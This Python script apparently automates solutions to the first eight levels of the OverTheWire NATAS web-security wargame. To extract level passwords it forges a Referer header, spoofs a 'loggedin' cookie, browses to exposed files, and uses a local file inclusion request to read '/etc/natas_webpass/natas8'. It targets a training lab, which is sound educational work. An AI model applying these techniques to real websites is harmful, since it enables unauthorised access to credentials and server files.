import http.client
import base64
import re

host = "natas.labs.overthewire.org"
login = "natas"
passwords = ["natas0"]
level = -1

def req(method, url, headers = {}, body=""):
    auth = base64.b64encode("{}{}:{}".format(login, level, passwords[level]).encode()).decode()
    headers["Authorization"] = "Basic {}".format(auth)
    conn = http.client.HTTPConnection("{}{}.{}".format(login, level, host))
    conn.request(
        method,
        url,
        headers=headers,
        body=body,
    )
    
    return(conn.getresponse())

def rex(method, url, regexp, headers = {}, body=""):
    print(" Request to web server: ", end="")
    res = req(method, url, headers, body)
    reg = None
    data = res.read().decode()
    if res.status == 200:
        print("OK")
        reg = re.search(regexp, data)
    else:
        print("Error ({})".format(res.status))

    return(res, reg)

print("___________________________")
print()
print(" OverTheWire wargame NATAS")
print("___________________________")
print()
print("Type help or ? for list of commands")

while True:
    cmd = input("> ").strip()
    if cmd == "": continue
    elif cmd == "quit" or cmd == "exit":
        exit()
    elif cmd == "help" or cmd == "?":
        print("passwords")
        print("level <n>")
        print("next")
        print("help")
        print("quit")
    elif cmd == "passwords":
        print("Level passwords:")
        for k, v in enumerate(passwords):
            print(" Level {}: {}".format(k, v))
    elif cmd == "level":
        print("Current level {}".format(level))
    elif cmd.startswith("level ") or cmd == "next" or cmd == "n":
        if cmd.startswith("level"):
            c = cmd.split(" ")
            if len(c) != 2 or not c[1].isdigit(): continue
            level = int(c[1])
        elif cmd == "next" or cmd == "n":
            if level > 34:
                print("You have reached the maximum level")
                continue
            else:
                level += 1

        if level >= len(passwords):
            print("You should complete level {} first".format(len(passwords) - 1))
            continue

        print("[Level {}]".format(level))

        if level == 0 or level == 1:
            print(" Search password in the source code of the page")
            res, reg = rex(
                "GET",
                "/",
                "<!--The password for natas[12] is (\w+) -->"
            )
            
            if reg:
                if len(passwords) == level + 1: passwords.append(reg[1])
                print(" Password found: {}".format(passwords[level + 1]))
            else:
                print(" Password not found")
        elif level == 2 or level == 3:
            if level == 2: f = "/files/users.txt"
            elif level == 3: f = "/s3cr3t/users.txt"
            
            print(" Search password in file {}".format(f))
            res, reg = rex("GET", f, "natas[34]:(\w+)")
            if reg:
                if len(passwords) == level + 1: passwords.append(reg[1])
                print(" Password found: {}".format(passwords[level + 1]))
            else:
                print(" Password not found")
        elif level == 4:
            r = "http://natas5.natas.labs.overthewire.org/"
            print(" Set Referer header to {}".format(r))
            res, reg = rex(
                "GET",
                "/",
                "The password for natas5 is (\w+)",
                headers={"Referer": r}
            )

            if reg:
                if len(passwords) == level + 1: passwords.append(reg[1])
                print(" Password found: {}".format(passwords[level + 1]))
            else:
                print(" Password not found")
        elif level == 5:
            c = "loggedin=1"
            print(" Set Cookie header to {}".format(c))
            res, reg = rex(
                "GET",
                "/",
                "The password for natas6 is (\w+)",
                headers={"Cookie": c}
            )
            
            if reg:
                if len(passwords) == level + 1: passwords.append(reg[1])
                print(" Password found: {}".format(passwords[level + 1]))
            else:
                print(" Password not found")
        elif level == 6:
            f = "/includes/secret.inc"
            print(" Search secret in file {}: ".format(f))
            res, reg = rex("GET", f, "\$secret = \"(\w+)\";")
            if reg:
                print(" Post form with secret {}".format(reg[1]))
                res, reg = rex(
                    "POST",
                    "/",
                    "The password for natas7 is (\w+)",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body="secret={}&submit=submit".format(reg[1])
                )

 
                if reg:
                    if len(passwords) == level + 1: passwords.append(reg[1])
                    print(" Password found: {}".format(passwords[level + 1]))
                else:
                    print(" Password not found")
        elif level == 7:
            u = "/index.php?page=/etc/natas_webpass/natas8"
            print(" Get page {}".format(u))
            res, reg = rex(
                "GET",
                u,
                "<br>\n<br>\n(\w+)\n",
            )
            
            if reg:
                if len(passwords) == level + 1: passwords.append(reg[1])
                print(" Password found: {}".format(passwords[level + 1]))
            else:
                print(" Password not found")

        else:
            print("Level must be between 1-34")
    else:
        print("Unknown command")
